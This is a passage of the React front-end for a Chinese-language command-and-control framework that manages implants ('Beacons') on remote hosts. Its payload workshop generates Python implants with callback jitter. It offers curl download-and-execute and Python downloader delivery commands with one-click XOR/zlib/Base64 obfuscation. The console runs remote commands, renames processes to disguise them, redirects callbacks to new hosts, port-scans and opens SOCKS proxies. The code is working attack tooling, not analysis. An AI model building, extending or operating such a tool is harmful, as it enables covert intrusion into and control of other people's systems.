            <div className="modal-actions"><button className="ghost danger" onClick={deleteGroup} disabled={!selectedGroupId}>删除分组</button><button className="ghost" onClick={batchDispatchGroup} disabled={!selectedGroupId}>批量下发</button><button className="primary" onClick={saveGroup}>保存分组</button></div>
          </div>
        </div>
      </Panel>

      <Panel title="自动命令设置" eyebrow="GLOBAL AUTO / ALL BEACONS" right={<span className="micro">ALL BEACONS</span>}>
        <div className="global-auto-editor">
          <div className="hint">默认对所有 Beacon 生效，不看分组。任何 Beacon 重新上线时都会按这里的顺序串行执行。</div>
          <div className="global-auto-list">
            {globalRows.map((row, index) => <div className={`global-auto-row ${dragIndex === index ? 'dragging' : ''}`} key={`global-${index}`} draggable onDragStart={() => setDragIndex(index)} onDragEnd={() => setDragIndex(-1)} onDragOver={e => e.preventDefault()} onDrop={() => { moveGlobalRow(dragIndex, index); setDragIndex(-1) }}>
              <span className="drag-handle" title="上下拖动排序">⋮⋮</span>
              <input value={row} onChange={e => updateGlobalRow(index, e.target.value)} placeholder="例如：pwd、ls /tmp、exec id" />
              <button className="ghost" onClick={() => moveGlobalRow(index, Math.max(0, index - 1))} disabled={index === 0}>↑</button>
              <button className="ghost" onClick={() => moveGlobalRow(index, Math.min(globalRows.length - 1, index + 1))} disabled={index === globalRows.length - 1}>↓</button>
              <button className="ghost danger" onClick={() => removeGlobalRow(index)}>×</button>
            </div>)}
            {!globalRows.length && <div className="empty">还没有全舰队自动命令</div>}
          </div>
          <div className="modal-actions"><button className="ghost" onClick={addGlobalRow}>＋ 添加命令</button><button className="primary" onClick={saveGlobalAuto}>保存自动命令</button></div>
          {globalMsg && <div className="banner info">{globalMsg}</div>}
        </div>
      </Panel>
    </div>

    {noteTarget && <div className="modal-back"><div className="modal beacon-note-modal"><div className="modal-head"><div><div className="eyebrow">BEACON NOTE</div><h2>{noteTarget.hostname}</h2><p className="micro">{noteTarget.id}</p></div><button className="ghost" onClick={() => setNoteTarget(null)}>关闭</button></div><div className="note-modal-body">{noteError && <div className="banner error">{noteError}</div>}<textarea value={noteText} onChange={e => setNoteText(e.target.value)} placeholder="记录这个 Beacon 是什么主机、什么业务、什么用途、注意事项……" autoFocus /></div><div className="modal-actions"><button className="ghost" onClick={() => setNoteTarget(null)}>取消</button><button className="primary" onClick={saveNote} disabled={noteBusy}>{noteBusy ? '保存中…' : '保存备注'}</button></div></div></div>}
  </div>
}

function Deployment({ protocols, listeners, refresh }) {
  return <div className="page deployment-page">
    <header className="page-head"><div><div className="eyebrow">DEPLOYMENT BAY</div><h1>监听与载荷<span>_</span></h1><p>监听器和载荷工坊集中在一个部署页面中，完成从传输入口到 Beacon 载荷生成的完整链路。</p></div></header>
    <div className="deploy-stack">
      <Listeners protocols={protocols} listeners={listeners} refresh={refresh} embedded />
      <Payloads listeners={listeners} embedded />
    </div>
  </div>
}

function Listeners({ protocols, listeners, refresh, embedded = false }) {
  const [form, setForm] = useState({ protocol: 'udp', host: '0.0.0.0', port: 19000, public_host: '' })
  const [msg, setMsg] = useState('')
  const create = async (e) => {
    e.preventDefault()
    try { await action('listener.create', { ...form, port: Number(form.port) }); setMsg('监听器已创建'); await refresh() } catch (err) { setMsg(err.message) }
  }
  const stop = async (id) => { try { await action('listener.stop', { listener_id: id }); await refresh() } catch (err) { setMsg(err.message) } }
  const start = async (id) => { try { await action('listener.start', { listener_id: id }); setMsg('监听器已启动'); await refresh() } catch (err) { setMsg(err.message) } }
  const restart = async (id) => { try { await action('listener.restart', { listener_id: id }); setMsg('监听器已重启'); await refresh() } catch (err) { setMsg(err.message) } }
  const remove = async (id) => {
    if (!window.confirm('确认移除该监听器？')) return
    try { await action('listener.remove', { listener_id: id }); setMsg('监听器已移除'); await refresh() } catch (err) { setMsg(err.message) }
  }
  const body = <div className="two-col narrow-left">
    <Panel title="创建监听器" eyebrow="LISTENER FACTORY">
      <form className="form" onSubmit={create}>
        <label>协议<select value={form.protocol} onChange={e => setForm({ ...form, protocol: e.target.value })}>{protocols.filter(p => !p.disabled).map(p => <option key={p.protocol} value={p.protocol}>{p.protocol} — {p.name}</option>)}</select></label>
        <label>绑定地址<input value={form.host} onChange={e => setForm({ ...form, host: e.target.value })} /></label>
        <label>绑定端口<input type="number" value={form.port} onChange={e => setForm({ ...form, port: e.target.value })} /></label>
        <label>公网 / 回连地址<input value={form.public_host} onChange={e => setForm({ ...form, public_host: e.target.value })} placeholder="留空自动检测本机 IP" /></label>
        <button className="primary">创建监听器</button>
      </form>
    </Panel>
    <Panel title="已创建监听器" eyebrow="ACTIVE">
      <div className="table">
        <div className="tr th"><span>协议</span><span>绑定 → 回连</span><span>端口</span><span>状态</span><span>操作</span></div>
        {listeners.map(l => <div className="tr" key={l.id}><span>{l.protocol}</span><span>{l.host} → {l.public_host}</span><span>{l.port}</span><span><Status status={l.status} /></span><span className="quick-buttons">{['stopped', 'failed'].includes(l.status) ? <button className="link" onClick={() => start(l.id)}>启动</button> : <><button className="link" onClick={() => restart(l.id)}>重启</button><button className="link danger" onClick={() => stop(l.id)}>停止</button></>}<button className="link danger" onClick={() => remove(l.id)}>移除</button></span></div>)}
        {!listeners.length && <div className="empty">暂无监听器</div>}
      </div>
    </Panel>
  </div>
  if (embedded) return <section className="overview-module"><div className="overview-module-head"><div><div className="eyebrow">TRANSPORT PLUGINS</div><h2>监听器</h2></div></div>{msg && <Banner text={msg} />}{body}</section>
  return <div className="page"><header className="page-head"><div><div className="eyebrow">TRANSPORT PLUGINS</div><h1>监听器</h1><p>协议插件创建监听器；协议与端口独立配置。</p></div></header>{msg && <Banner text={msg} />}{body}</div>
}

function Payloads({ listeners, embedded = false }) {
  const [listenerId, setListenerId] = useState(listeners[0]?.id || '')
  const [name, setName] = useState('单阶段载荷')
  const [opts, setOpts] = useState({ fast_interval: 5, slow_interval: 30, finish_delay: 5, jitter: 0.2, max_concurrent_tasks: 8 })
  const [generated, setGenerated] = useState(null)
  const [obfBusy, setObfBusy] = useState('')
  const [msg, setMsg] = useState('')
  useEffect(() => { if (!listenerId && listeners[0]) setListenerId(listeners[0].id) }, [listeners, listenerId])
  const generate = async (e) => {
    e.preventDefault()
    try {
      const p = await action('payload.generate', { listener_id: listenerId, name, public_url: window.location.origin.replace(/:\d+$/, ':18080'), ...opts })
      setGenerated(p); setMsg('载荷已生成。载荷只保留在当前服务端内存中，不写入历史。')
    } catch (err) { setMsg(err.message) }
  }
  const toggleObfuscation = async (method) => {
    if (!generated || obfBusy) return
    const currentlyEnabled = !!generated.obfuscated_methods?.[method]
    setObfBusy(method); setMsg('')
    try {
      const updated = await action('payload.obfuscate', { payload_id: generated.id, method, enabled: !currentlyEnabled })
      setGenerated(updated)
      const labels = { direct_echo: '直接 Echo', short_downloader: '短 Python 下载器', curl: 'Curl 下载执行' }
      setMsg(`${labels[method] || method}：${!currentlyEnabled ? '已开启独立混淆模式' : '已恢复原始命令'}`)
    } catch (err) { setMsg(err.message) } finally { setObfBusy('') }
  }
  const body = <div className="two-col narrow-left">
    <Panel title="生成载荷" eyebrow="BUILD">
      <form className="form" onSubmit={generate}>
        <label>监听器<select value={listenerId} onChange={e => setListenerId(e.target.value)}>{listeners.map(l => <option value={l.id} key={l.id}>{l.protocol} / {l.public_host}:{l.port}</option>)}</select></label>
        <label>名称<input value={name} onChange={e => setName(e.target.value)} /></label>
        <div className="payload-options">
          <label>快速回连(s)<input type="number" step="0.5" value={opts.fast_interval} onChange={e => setOpts({ ...opts, fast_interval: e.target.value })} /></label>
          <label>缓慢回连(s)<input type="number" step="1" value={opts.slow_interval} onChange={e => setOpts({ ...opts, slow_interval: e.target.value })} title="空闲时的最大回连间隔，也决定任务最长等待时间" /></label>
          <label>聚合窗口(s)<input type="number" step="0.5" value={opts.finish_delay} onChange={e => setOpts({ ...opts, finish_delay: e.target.value })} /></label>
          <label>抖动比例<input type="number" step="0.05" min="0" max="0.9" value={opts.jitter} onChange={e => setOpts({ ...opts, jitter: e.target.value })} /></label>
          <label>最大并发<input type="number" step="1" min="1" max="64" value={opts.max_concurrent_tasks} onChange={e => setOpts({ ...opts, max_concurrent_tasks: e.target.value })} /></label>
        </div>
        <button className="primary" disabled={!listenerId}>生成单阶段载荷</button>
      </form>
      <div className="hint" style={{ padding: '12px 15px' }}>当前载荷：{generated ? generated.id : '尚未生成'}<br />载荷 Token：{generated ? generated.token : '—'}<br />历史：不保存</div>
    </Panel>
    <Panel title={generated ? generated.name : '投递方式'} eyebrow="DELIVERY">
      {!generated ? <div className="empty">生成载荷后在此显示投递方式。历史载荷不会出现在列表中。</div> : <div className="delivery">
        <div className="meta-grid"><div><span>Beacon</span><code>{generated.beacon_id}</code></div><div><span>协议</span><strong>{generated.protocol}</strong></div><div><span>大小</span><strong>{generated.size} B</strong></div><div><span>混淆状态</span><strong>已混淆 {Object.values(generated.obfuscated_methods || {}).filter(Boolean).length}/3 种投递</strong></div><div><span>下载</span><a className="link" href={generated.download_url}>payload.py</a></div><div><span>快端 / 慢端</span><strong>{generated.settings?.fast_interval}s / {generated.settings?.slow_interval}s</strong></div><div><span>抖动 / 聚合</span><strong>{generated.settings?.jitter} / {generated.settings?.finish_delay}s</strong></div><div><span>最大并发</span><strong>{generated.settings?.max_concurrent_tasks}</strong></div></div>
        {['direct_echo', 'short_downloader', 'curl'].map(k => { const rowObf = !!generated.obfuscated_methods?.[k]; return <div className={`delivery-box ${rowObf ? 'obfuscated' : ''}`} key={k}><div className="subhead"><span>{k === 'direct_echo' ? '直接 Echo' : k === 'curl' ? 'Curl 下载执行' : '短 Python 下载器'}</span><div className="quick-buttons"><button className={rowObf ? 'link danger' : 'link'} onClick={() => toggleObfuscation(k)} disabled={!!obfBusy} title="只对当前投递方式切换随机 XOR + zlib + Base64 混淆，不影响另外两种投递命令">{obfBusy === k ? '处理中…' : rowObf ? '关闭混淆' : '混淆模式'}</button><CopyButton text={generated.methods?.[k] || ''}>复制命令</CopyButton></div></div><pre>{generated.methods?.[k]}</pre></div> })}
      </div>}
    </Panel>
  </div>
  if (embedded) return <section className="overview-module"><div className="overview-module-head"><div><div className="eyebrow">SINGLE STAGE PAYLOAD</div><h2>载荷工坊</h2></div></div>{msg && <Banner text={msg} />}{body}</section>
  return <div className="page"><header className="page-head"><div><div className="eyebrow">SINGLE STAGE PAYLOAD</div><h1>载荷工坊</h1><p>先监听器，后载荷。载荷不保存历史；服务端重启后需重新生成。</p></div></header>{msg && <Banner text={msg} />}{body}</div>
}

function parseCommandLine(line) {
  const tokens = []
  let buf = ''
  let quote = null
  let escaped = false
  let started = false
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]
    if (escaped) { buf += ch; escaped = false; started = true; continue }
    if (ch === '\\' && quote !== "'") { escaped = true; started = true; continue }
    if (quote) {
      if (ch === quote) { quote = null; started = true } else { buf += ch }
      continue
    }
    if (ch === "'" || ch === '"') { quote = ch; started = true; continue }
    if (/\s/.test(ch)) {
      if (started) { tokens.push(buf); buf = ''; started = false }
      continue
    }
    buf += ch; started = true
  }
  if (escaped) buf += '\\'
  if (started) tokens.push(buf)
  const firstSpace = line.search(/\s/)
  const rawRest = firstSpace >= 0 ? line.slice(firstSpace + 1) : ''
  return { tokens, rawRest }
}

function commandArgs(cmdline, defaultPath) {
  const { tokens, rawRest } = parseCommandLine(cmdline)
  const cmd = tokens[0] || ''
  const rest = tokens.slice(1)
  const args = {}
  if (cmd === 'lexec' || cmd === 'wexec' || cmd === 'exec') {
    args.command = rawRest
    return { cmd, args }
  }
  if (cmd === 'python') {
    args.code = rawRest
    return { cmd, args }
  }
  if (cmd === 'tasks' || cmd === 'ltasks' || cmd === 'wtasks') {
    return { cmd, args }
  }
  if (['upgrade', 'lupgrade', 'wupgrade'].includes(cmd)) {
    for (let i = 0; i < rest.length; i++) {
      const token = rest[i]
      if (!token.startsWith('--')) continue
      const [rawKey, inline] = token.slice(2).split('=', 2)
      const key = ['url', 'host', 'port', 'protocol', 'key', 'token'].includes(rawKey) ? rawKey : ''
      if (!key) continue
      let value = inline
      if (value === undefined) value = rest[++i]
      if (value !== undefined) args[key] = key === 'port' ? Number(value) : value
    }
    return { cmd, args }
  }
  if (['masquerade', 'lmasquerade', 'wmasquerade'].includes(cmd)) {
    args.new_name = rawRest.trim()
    return { cmd, args }
  }
  if (cmd === 'fork' || cmd === 'lfork' || cmd === 'wfork') {
    return { cmd, args }
  }
  if (cmd === 'killbeacon' || cmd === 'lkillbeacon' || cmd === 'wkillbeacon') {
    return { cmd, args }
  }
  if (['settings', 'lsettings', 'wsettings'].includes(cmd)) {
    const flags = { min: 'fast_interval', fast: 'fast_interval', max: 'slow_interval', slow: 'slow_interval', current: 'current_interval', jitter: 'jitter', finish: 'finish_delay', aggregate: 'finish_delay', concurrency: 'max_concurrent_tasks', workers: 'max_concurrent_tasks' }
    for (let i = 0; i < rest.length; i++) {
      const token = rest[i]
      if (!token.startsWith('--')) continue
      const [rawKey, inline] = token.slice(2).split('=', 2)
      const key = flags[rawKey]
      if (!key) continue
      let value = inline
      if (value === undefined) {
        const candidate = rest[++i]
        if (candidate === undefined || candidate.startsWith('--')) { i -= 1; continue }
        value = candidate
      }
      const numeric = Number(value)
      if (Number.isFinite(numeric)) args[key] = numeric
    }
    return { cmd, args }
  }
  if (cmd === 'killtask' || cmd === 'lkilltask' || cmd === 'wkilltask') {
    args.task_id = rest[0] || ''
    return { cmd, args }
  }
  if (['cd', 'ls', 'cat', 'pwd', 'mkdir', 'rm', 'tail', 'tee', 'dd', 'df', 'free', 'sysinfo', 'ps', 'netstat', 'whoami', 'env'].includes(cmd)) {
    args.path = rest[0] || defaultPath
    if (cmd === 'tail') args.lines = Number(rest[1] || 20)
    if (cmd === 'rm') args.recursive = rest.includes('-r') || rest.includes('--recursive')
    if (cmd === 'dd') { args.op = rest[1] || 'read'; if (rest[2]) args.offset = Number(rest[2]); if (rest[3]) args.length = Number(rest[3]) }
    return { cmd, args }
  }
  if (cmd === 'mv' || cmd === 'cp') {
    args.source = rest[0] || ''
    args.target = rest[1] || ''
    return { cmd, args }
  }
  if (['find', 'lfind', 'wfind'].includes(cmd)) {
    args.path = rest[0] || defaultPath
    args.pattern = rest[1] || '*'
    return { cmd, args }
  }
  if (['grep', 'lgrep', 'wgrep'].includes(cmd)) {
    args.path = rest[0] || defaultPath
    args.pattern = rest[1] || ''
    args.ignore_case = rest.includes('-i')
    return { cmd, args }
  }
  if (cmd === 'ldf') { args.path = rest[0] || '/'; return { cmd, args } }
  if (cmd === 'lkill' || cmd === 'wkill') { args.pid = Number(rest[0] || 0); return { cmd, args } }
  if (cmd === 'ping') { args.host = rest[0] || ''; if (rest[1]) args.ports = rest[1].split(',').map(Number); return { cmd, args } }
  if (cmd === 'nmap') { args.host = rest[0] || ''; args.ports = rest[1] || '1-1024'; args.timeout = Number(rest[2] || 0.5); return { cmd, args } }
  if (rest.length) args.path = rest[0]
  return { cmd, args }
}

function autoTasksFromText(text) {
  return String(text || '').split('\n').map(line => line.trim()).filter(Boolean).map(line => {
    const parsed = commandArgs(line, '.')
    return { command: line, plugin: parsed.cmd, args: parsed.args }
  })
}

const COMMAND_HELP = {
  'cd': { args: 'path', placeholder: '/tmp' },
  'lls': { args: 'path', placeholder: '/tmp' },
  'lcat': { args: 'path', placeholder: '/etc/hosts' },
  'mkdir': { args: 'path', placeholder: '/tmp/newdir' },
  'rm': { args: 'path', placeholder: '/tmp/file' },
  'tail': { args: 'path lines', placeholder: '/var/log/syslog 50' },
  'ping': { args: 'host [ports]', placeholder: '192.0.2.10 80,443,22' },
  'nmap': { args: 'host [ports]', placeholder: '192.0.2.10 1-1024' },
  'luname': { args: '', placeholder: '' },
  'lps': { args: '', placeholder: '' },
  'lnetstat': { args: '', placeholder: '' },
  'wps': { args: '', placeholder: '' },
  'wnetstat': { args: '', placeholder: '' },
  'tasks': { args: '', placeholder: '' },
  'killtask': { args: 'task_id', placeholder: 'task_xxxxxxxxx' },
  'settings': { args: '--min --max --current --jitter --finish --concurrency', placeholder: '--max 30 --min 5' },
  'upgrade': { args: '--url|--host --port --protocol [--token] [--key]', placeholder: '--host 192.0.2.10 --port 9001 --protocol tcp' },
  'fork': { args: '', placeholder: '' },
  'killbeacon': { args: '', placeholder: '' },
}

function blobToBase64(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => {
      const result = String(reader.result || '')
      resolve(result.includes(',') ? result.split(',', 2)[1] : result)
    }
    reader.onerror = () => reject(reader.error || new Error('读取本地文件失败'))
    reader.readAsDataURL(blob)
  })
}

function normalizeTaskData(task) {
  return task?.result?.data || task?.data || {}
}

function formatTaskOutput(task) {
  const data = normalizeTaskData(task)
  if (Array.isArray(data.entries)) {
    const lines = [`${data.path || ''}  (${data.entries.length} entries)`]
    for (const entry of data.entries) {
      const type = entry.kind === 'dir' ? 'd' : entry.kind === 'error' ? '?' : '-'
      const mode = String(entry.mode || '----------')
      const modeText = mode.length >= 10 ? type + mode.slice(1) : type + '---------'
      const owner = entry.owner ?? entry.uid ?? '—'
      const group = entry.group ?? entry.gid ?? '—'
      lines.push(`${modeText} ${owner}:${group} ${String(entry.size ?? 0).padStart(10)} ${entry.mtime || ''} ${entry.name}`)
    }
    if (data.truncated) lines.push('[result truncated by plugin/source limit]')
    return lines.join('\n')
  }
  if (typeof data.text === 'string' && data.text) {
    return data.text + (data.truncated ? '\n[file content truncated by transport limit]' : '')
  }
  return task.output || task.error || JSON.stringify(task.result || {})
}


async function waitTask(taskId, onUpdate) {
  let current = null
  let lastStatus = ''
  for (let i = 0; i < 600; i++) {
    await new Promise(r => setTimeout(r, 500))
    current = await action('task.show', { task_id: taskId })
    if (current.status !== lastStatus) {
      lastStatus = current.status
      onUpdate?.(current)
    }
    if (['succeeded', 'failed', 'cancelled'].includes(current.status)) return current
  }
  return { ...(current || {}), timedOut: true }
}

async function runTaskAndWait(beaconId, plugin, args = {}, onUpdate) {
  const task = await action('task.create', { beacon_id: beaconId, plugin, args })
  onUpdate?.({ ...task, phase: 'created' })
  return waitTask(task.id, onUpdate)
}

function LineFilter({ entries, filter, setFilter, nextFilter, setNextFilter }) {
  const [pattern, setPattern] = useState('')
  const [mode, setMode] = useState('off')
  const [error, setError] = useState('')
  const apply = () => {
    setError('')
    if (!pattern.trim()) {
      setFilter({ pattern: '', mode: 'off', ids: [] })
      setNextFilter('')
      return
    }
    try { new RegExp(pattern, 'i') } catch (err) { setError(`正则无效：${err.message}`); return }
    if (mode === 'next') {
      setNextFilter(pattern)
      setFilter({ pattern: '', mode: 'off', ids: [] })
    } else if (mode === 'current') {
      setFilter({ pattern, mode: 'current', ids: entries.map(item => item.id) })
      setNextFilter('')
    } else if (mode === 'sticky') {
      setFilter({ pattern, mode: 'sticky', ids: [] })
      setNextFilter('')
    } else {
      setFilter({ pattern: '', mode: 'off', ids: [] })
      setNextFilter('')
    }
  }
  const clear = () => {
    setPattern(''); setMode('off'); setError('')
    setFilter({ pattern: '', mode: 'off', ids: [] }); setNextFilter('')
  }
  return <div className="filter-bar filter-bar-rich">
    <input placeholder="正则，例如 error|timeout|README" value={pattern} onChange={e => setPattern(e.target.value)} onKeyDown={e => e.key === 'Enter' && apply()} />
    <select value={mode} onChange={e => setMode(e.target.value)}>
      <option value="off">关闭筛选</option>
      <option value="current">筛选当前屏幕</option>
      <option value="next">筛选下一条结果</option>
      <option value="sticky">持续筛选</option>
    </select>
    <button className="primary" onClick={apply}>应用</button>
    <button className="ghost" onClick={clear}>清除</button>
    {nextFilter && <span className="micro filter-active">NEXT: {nextFilter}</span>}
    {filter.mode !== 'off' && <span className="micro filter-active">ACTIVE: {filter.mode} / {filter.pattern}</span>}
    {error && <span className="filter-error">{error}</span>}
  </div>
}

function filterText(text, pattern) {
  if (!pattern) return text
  try {
    const re = new RegExp(pattern, 'i')
    return text.split('\n').filter(line => re.test(line)).join('\n')
  } catch { return text }
}

function shellQuote(value) {
  return `'${String(value ?? '').replace(/'/g, "'\\''")}'`
}

function BeaconConsole({ beacon, plugins, listeners, onBack }) {
  const [tab, setTab] = useState('terminal')
  const [beaconInfo, setBeaconInfo] = useState(beacon)
  const [beaconSettings, setBeaconSettings] = useState({ fast_interval: 5, slow_interval: 30, finish_delay: 5, jitter: 0.2, max_concurrent_tasks: 8, current_interval: 5 })
  const [settingsDirty, setSettingsDirty] = useState(false)
  const [settingsMsg, setSettingsMsg] = useState('')
  const [beaconNote, setBeaconNote] = useState('')
  const [noteDirty, setNoteDirty] = useState(false)
  const [noteMsg, setNoteMsg] = useState('')
  const [autoText, setAutoText] = useState('')
  const [autoDirty, setAutoDirty] = useState(false)
  const [autoMsg, setAutoMsg] = useState('')
  const [autoBusy, setAutoBusy] = useState(false)
  const [upgradeForm, setUpgradeForm] = useState({ protocol: 'tcp', target: '', port: '', token: '', key: '' })
  const [protocolMsg, setProtocolMsg] = useState('')
  const [path, setPath] = useState('.')
  const [entries, setEntries] = useState([])
  const [selectedFile, setSelectedFile] = useState(null)
  const [fileEdit, setFileEdit] = useState('')
  const [fileMode, setFileMode] = useState('view')
  const [fileMsg, setFileMsg] = useState('')
  const [createFileOpen, setCreateFileOpen] = useState(false)
  const [createFileDir, setCreateFileDir] = useState('.')
  const [createFileName, setCreateFileName] = useState('')
  const [createFileContent, setCreateFileContent] = useState('')
  const [createFileBusy, setCreateFileBusy] = useState(false)
  const [deleteFileOpen, setDeleteFileOpen] = useState(false)
  const [deleteFileBusy, setDeleteFileBusy] = useState(false)
  const [outputs, setOutputs] = useState([])
  const [taskHistory, setTaskHistory] = useState([])
  const [queueMsg, setQueueMsg] = useState('')
  const [stopBusy, setStopBusy] = useState(false)
  const [input, setInput] = useState('')
  const [history, setHistory] = useState([])
  const [historyEntries, setHistoryEntries] = useState([])
  const [historyIndex, setHistoryIndex] = useState(-1)
  const [showSuggest, setShowSuggest] = useState(false)
  const [filter, setFilter] = useState({ pattern: '', mode: 'off' })
  const [nextFilter, setNextFilter] = useState('')
  const [busy, setBusy] = useState(false)
  const terminalRef = useRef(null)
  const terminalScrollRef = useRef({ top: 0, follow: true })
  const [parallelTaskCount, setParallelTaskCount] = useState(0)
  const [pyName, setPyName] = useState('script')
  const [pyScript, setPyScript] = useState("import os\n\nprint('hello from', os.getcwd())\n")
  const [templates, setTemplates] = useState([])
  const [templateName, setTemplateName] = useState('')
  const [templateMsg, setTemplateMsg] = useState('')
  const [quickModule, setQuickModule] = useState('system')
  const [quickParams, setQuickParams] = useState({ path: '', pattern: '*', lines: 20, host: '127.0.0.1', ports: '1-1024', command: 'id', proxyPort: 1080 })
  const [quickDialog, setQuickDialog] = useState(null)
  const [quickSearch, setQuickSearch] = useState('')
  const [quickValues, setQuickValues] = useState({})
  const pluginNames = useMemo(() => {
    const prefix = beacon.platform === 'windows' ? 'w' : 'l'
    const base = plugins.filter(p => p.kind === 'implant' && p.platform === beacon.platform).flatMap(p => p.commands?.length ? p.commands : [p.name]).map(name => name.startsWith(prefix) && name.length > 1 ? name.slice(1) : name)
    return [...new Set(['proxy start', 'proxy stop', 'proxy info', 'socks start', 'socks stop', 'socks info', ...base])]
  }, [plugins, beacon.platform])
  const suggestions = pluginNames.filter(name => name.toLowerCase().startsWith(input.split(' ')[0].toLowerCase())).slice(0, 10)

  const localFetch = async (url, options = {}) => {
    const res = await fetch(url, { ...options, headers: { 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '', ...(options.headers || {}) } })
    return res.json()
  }
  const loadHistory = useCallback(async () => {
    const data = await localFetch('/api/local/history?limit=300')
    const items = data.items || []
    setHistoryEntries(items)
    setHistory(items.map(item => item.command))
  }, [])
  const loadTaskHistory = useCallback(async () => {
    try {
      const tasks = await action('task.list', { beacon_id: beacon.id })
      setTaskHistory((tasks || []).slice(0, 200).reverse())
    } catch { /* transient refresh errors are shown by the main app */ }
  }, [beacon.id])
  useEffect(() => {
    loadTaskHistory()
    const id = setInterval(loadTaskHistory, 4000)
    return () => clearInterval(id)
  }, [loadTaskHistory])
  const recordHistory = async (command, kind = 'command') => {
    await localFetch('/api/local/history', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command, kind, beacon_id: beacon.id, beacon_host: beacon.hostname }),
    })
    await loadHistory()
  }
  const loadTemplates = useCallback(async () => {
    const data = await localFetch('/api/local/templates')
    setTemplates(data.items || [])
  }, [])
  useEffect(() => { loadHistory(); loadTemplates() }, [loadHistory, loadTemplates])

  const loadBeaconInfo = useCallback(async () => {
    try {
      const info = await action('beacon.show', { beacon_id: beacon.id })
      setBeaconInfo(info)
      if (!noteDirty) setBeaconNote(info.note || '')
      if (!autoDirty) setAutoText((info.auto_tasks || []).map(task => task.command || task.plugin).join('\n'))
      if (!settingsDirty) {
        const s = info.settings || {}
        setBeaconSettings({
          fast_interval: s.fast_interval ?? info.heartbeat_fast ?? 5,
          slow_interval: s.slow_interval ?? info.heartbeat_slow ?? 30,
          finish_delay: s.finish_delay ?? info.result_finish_delay ?? 5,
          jitter: s.jitter ?? info.heartbeat_jitter ?? 0.2,
          max_concurrent_tasks: s.max_concurrent_tasks ?? info.max_concurrent_tasks ?? 8,
          current_interval: info.heartbeat_interval ?? s.current_interval ?? 5,
        })
      }
    } catch (err) { setSettingsMsg(err.message) }
  }, [beacon.id, settingsDirty, noteDirty, autoDirty])
  useEffect(() => { loadBeaconInfo(); const id = setInterval(loadBeaconInfo, 5000); return () => clearInterval(id) }, [loadBeaconInfo])
  const updateBeaconSetting = (key, value) => {
    setSettingsDirty(true)
    setBeaconSettings(prev => ({ ...prev, [key]: value }))
  }
  const saveBeaconSettings = async () => {
    setSettingsMsg('')
    try {
      const out = await action('beacon.settings', { beacon_id: beacon.id, settings: {
        fast_interval: Number(beaconSettings.fast_interval),
        slow_interval: Number(beaconSettings.slow_interval),
        finish_delay: Number(beaconSettings.finish_delay),
        jitter: Number(beaconSettings.jitter),
        max_concurrent_tasks: Number(beaconSettings.max_concurrent_tasks),
        current_interval: Number(beaconSettings.current_interval),
      } })
      setSettingsDirty(false)
      setSettingsMsg(out?.task ? `设置任务已下发：${out.task.id}` : '设置已下发')
      await loadBeaconInfo()
    } catch (err) { setSettingsMsg(err.message) }
  }

  const saveBeaconNote = async () => {
    setNoteMsg('')
    try {
      const saved = await action('beacon.note', { beacon_id: beacon.id, note: beaconNote })
      setNoteDirty(false)
      setNoteMsg(`备注已保存 · ${saved.note_updated_at || ''}`)
      await loadBeaconInfo()
    } catch (err) { setNoteMsg(err.message) }
  }

  const saveBeaconAuto = async () => {
    setAutoMsg('')
    setAutoBusy(true)
    try {
      await action('beacon.auto.set', { beacon_id: beacon.id, auto_tasks: autoTasksFromText(autoText), enabled: true })
      setAutoDirty(false)
      setAutoMsg('自动任务已保存，下次 Beacon 上线时按顺序执行')
      await loadBeaconInfo()
    } catch (err) { setAutoMsg(err.message) } finally { setAutoBusy(false) }
  }

  const runBeaconAuto = async () => {
    setAutoMsg('')
    setAutoBusy(true)
    try {
      const result = await action('beacon.auto.run', { beacon_id: beacon.id, auto_tasks: autoTasksFromText(autoText) })
      setAutoMsg(`已开始串行执行 ${result.tasks} 条自动任务`)
      await loadBeaconInfo()
    } catch (err) { setAutoMsg(err.message) } finally { setAutoBusy(false) }
  }

  const upgradeProtocol = async () => {
    const target = String(upgradeForm.target || '').trim()
    if (!target) { setProtocolMsg('请输入目标 IP 或 URL'); return }
    setProtocolMsg('')
    try {
      const args = { protocol: upgradeForm.protocol }
      if (target.includes('://')) args.url = target
      else args.host = target
      if (String(upgradeForm.port || '').trim()) args.port = Number(upgradeForm.port)
      if (String(upgradeForm.token || '').trim()) args.token = upgradeForm.token.trim()
      if (String(upgradeForm.key || '').trim()) args.key = upgradeForm.key.trim()
      const task = await action('task.create', { beacon_id: beacon.id, plugin: 'upgrade', args })
      setProtocolMsg(`协议升级任务已下发：${task.id} · ${upgradeForm.protocol} · ${target}${args.port ? `:${args.port}` : ''}`)
      await loadBeaconInfo()
    } catch (err) { setProtocolMsg(err.message) }
  }

  const loadDir = useCallback(async (target = path) => {
    setBusy(true); setFileMsg('')
    try {
      const taskRecord = await action('file.list', { beacon_id: beacon.id, path: target })
      setFileMsg(`任务已下发 · ${taskRecord.id} · 等待 Beacon 领取…`)
      const task = await waitTask(taskRecord.id, state => {
        if (state.status === 'dispatched') setFileMsg(`Beacon 已获取任务 · 正在读取目录…`)
      })
      if (task.timedOut) { setFileMsg(`等待超时 · 当前状态：${task.status || 'unknown'} · 请检查 Beacon 是否在线`)
      } else {
        const data = normalizeTaskData(task)
        if (data.entries) { setEntries(data.entries); setPath(data.path || target); setFileMsg(data.truncated ? '目录已读取 · Beacon 已获取任务 · 结果按传输限制截断' : '目录已读取 · Beacon 已获取任务') }
        else setFileMsg(task.output || task.error || '目录读取失败')
      }
    } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
  }, [beacon.id, path])
  useEffect(() => { if (tab === 'files' && !entries.length) loadDir('.') }, [tab])

  const openFile = async (entry) => {
    if (entry.kind === 'dir') { await loadDir(entry.path); return }
    setBusy(true); setFileMsg('')
    try {
      const taskRecord = await action('file.read', { beacon_id: beacon.id, path: entry.path, length: 4 * 1024 * 1024 })
      setFileMsg(`任务已下发 · ${taskRecord.id} · 等待 Beacon 领取…`)
      const task = await waitTask(taskRecord.id, state => {
        if (state.status === 'dispatched') setFileMsg('Beacon 已获取任务 · 正在读取文件…')
      })
      if (task.timedOut) { setFileMsg(`等待超时 · 当前状态：${task.status || 'unknown'} · 请检查 Beacon 是否在线`)
      } else {
        const data = normalizeTaskData(task)
        setSelectedFile({ path: entry.path, name: entry.name, text: data.text || task.output || '', binary: !!data.binary, content_b64: data.content_b64 || '', truncated: !!data.truncated })
